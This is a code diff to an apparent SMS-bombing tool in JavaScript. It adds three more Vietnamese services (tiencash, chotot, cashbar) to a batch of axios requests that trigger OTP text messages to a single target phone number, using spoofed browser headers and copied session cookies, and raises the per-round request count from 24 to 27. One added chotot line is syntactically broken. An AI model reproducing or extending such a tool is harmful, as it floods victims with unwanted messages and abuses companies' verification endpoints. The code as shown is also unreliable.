@@ -771,6 +771,88 @@ const payload = {
         'captcha': '03AFcWeA57DLZ2vpQbBNFdhiRbVl9Tl7LLgZNidOGidwem9Qe35fs7vriYjyeNbAHMucJqqubWkbk3utAUXx4-qrLh-ua7cURkFSvCbwjHP-5c8JzP8X8SYo9pTUGqpvBzMhidETa3Z8VDrHiiIfqmsYmEDqxnboFGMQx5CB44u8UxKmqg2egTmd2FGbYheVmTEPUUMZhP84u8T0N_R8_ybq2_2KhyvBETIX2iZni8vRSjl0osIeZ3GAqrq9goXdsml2AEi5s9HfHvktW00l5xvaNvt4FT-AHcqML0jvq-y95-J7sPzjjZRHpKD1q0Mw9NvGR_iFe6DkKpuuM83OjgWVRW2JxCRDE2FKZQ3p7Z0qIV4NqaxlJdTl6lE0RRqXnUAZiEkN0Rm4sSPhD4JkUYJPkAbDMp9FcVb_23bMBDkFtw7jmVaD6FxLFMC99Yl6xR6AUMp3ECYVHeuGV6zchUydZp3aTQAYgIFAipAUGym3eIRuaeq0TfxIzcRNMAtgkYMrwyVFrT46aMYDhQqScFUQvTRve0tpBcmgIwjyb9893ThF54reVSqAHyYoAHPcEUnXJqxvl3onmNehC_qzdNCN6jX9IKKDsvZA',
     };
 
+    const tiencashHeaders = {
+      'Accept': 'application/json, text/javascript, */*; q=0.01',
+        'Accept-Language': 'en-US,en;q=0.9,vi;q=0.8',
+        'Connection': 'keep-alive',
+        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        'DNT': '1',
+        'Origin': 'https://www.tiencash.com',
+        'Referer': 'https://www.tiencash.com/',
+        'Sec-Fetch-Dest': 'empty',
+        'Sec-Fetch-Mode': 'cors',
+        'Sec-Fetch-Site': 'same-site',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
+        'deviceInfo': '{"operationSys":"","channel":null,"isMobile":"0","navigatorInfo":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36","screenHeight":768,"screenWidth":1366}',
+        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'token': 'null',
+    };
+
+    const tiencashData = {
+      'phone': phone,
+        'sign': '67d44dda-b29f-48a4-9830-67121bc618f8',
+    };
+
+    const chototCookies = {
+      '_cfuvid': '_0Whbo9vhBgRfrX3KU.0_Em.3JNUy5p8NFpTsv0g07g-1703862344968-0-604800000',
+        '_gcl_au': '1.1.1302306825.1703862353',
+        'ctfp': 'af0b5e10-f911-435d-8219-ea319f569cad',
+        'showInsertAdOnboarding': 'true',
+        'cf_clearance': '7PVCE6rX6Mz9UV9bIHmL7EeNGtGWPPwv2rzp1SjXN6A-1703862357-0-2-9d5da78d.b957bcb1.ca5cf86d-0.2.1703862357',
+        '_gid': 'GA1.2.754189873.1703862358',
+        '_gat_UA-54934741-3': '1',
+        '_fbp': 'fb.1.1703862360800.11155083',
+        '_ga': 'GA1.2.1777081749.1703862358',
+        'FCNEC': '%5B%5B%22AKsRol_ciqRB1xZluibXdogEf1wY5NcwxTUVCV7gL3lzzI9H-0Rhja7YDAYJfKgXp5X4qNLUwb8vJPDpeF2wEuL1JCy-m60XTJVGptiz0SrQcoDCG_l_tX-ybKmaGLZZI1WzHQMUGlCS6wErdDh02FYLFpvBJjSKQg%3D%3D%22%5D%5D',
+        '_ga_XQVN5K27XX': 'GS1.1.1703862358.1.1.1703862387.31.0.0',
+    };
+
+    const chototHeaders = {
+      'authority': 'id.chotot.com',
+        'accept': '*/*',
+        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
+        'baggage': 'sentry-environment=prod,sentry-release=ct-web-chotot-id%402.0.0,sentry-transaction=%2Fregister%2Fotp,sentry-public_key=a0cf9ad72b214ec5a3264cec648ff179,sentry-trace_id=3bb6c23624f34a47bb017aa52ab0241a,sentry-sample_rate=0.1',
+        'dnt': '1',
+        'referer': 'https://id.chotot.com/register',
+        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'sentry-trace': '3bb6c23624f34a47bb017aa52ab0241a-83bbc78ff51d14b7-0',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+        'x-nextjs-data': '1',
+    };
+
+    const chototParams = {
+      'phone': phone,
+    };
+
+    const cashbarHeaders = {
+      'Host': 'api.cashbar.tech',
+        'accept': 'application/json, text/plain, */*',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 9; SM-G973N Build/PQ3B.190801.09191650) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36',
+        'content-type': 'application/x-www-form-urlencoded',
+        'origin': 'https://h5.cashbar.tech',
+        'x-requested-with': 'mark.via.gp',
+        'sec-fetch-site': 'same-site',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-dest': 'empty',
+        'referer': 'https://h5.cashbar.tech/',
+        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+    };
+
+    const cashbarData = {
+      'phone': phone,
+        'type': '2',
+        'ctype': '1',
+        'chntoken': '',
+    };
+
+
     // Initial message to be edited later
     let messageID = null;
     let successCount = 0;
@@ -851,14 +933,17 @@ const payload = {
         axios.options('https://online-gateway.ghn.vn/sso/public-api/v2/client/checkexistphone', { headers: onlineHeaders }), 
         axios.post('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp', ghnData, { headers: ghnHeaders }),
         axios.post('https://thepizzacompany.vn/customer/ResendOtp', tpcData, { headers: tpcHeaders, cookies: tpcCookies }), 
-        axios.post('https://ubofood.com/auth/register', ubofoodData, { headers: ubofoodHeaders, cookies: ubofoodCookies }), 
+        axios.post('https://ubofood.com/auth/register', ubofoodData, { headers: ubofoodHeaders, cookies: ubofoodCookies }),
+        axios.post('https://api.tiencash.com/v1/verify/sms/send', tiencashData, { headers: tiencashHeaders }),
+        axios.get('https://id.chotot.com/_next/data/FbXG9nuM-6zJwYIP9V0dP/register/otp.json', chototParams { headers: chototHeaders, cookies: chototCookies }),
+        axios.post('https://api.cashbar.tech/h5/LoginMessage_ultimate', cashbarData, { headers: cashbarHeaders }), 
         ])
       .then(() => {
-        successCount += 24;
+        successCount += 27;
         updateMessage();
       })
       .catch(() => {
-        failureCount += 24;
+        failureCount += 27;
         updateMessage();
       });
     };
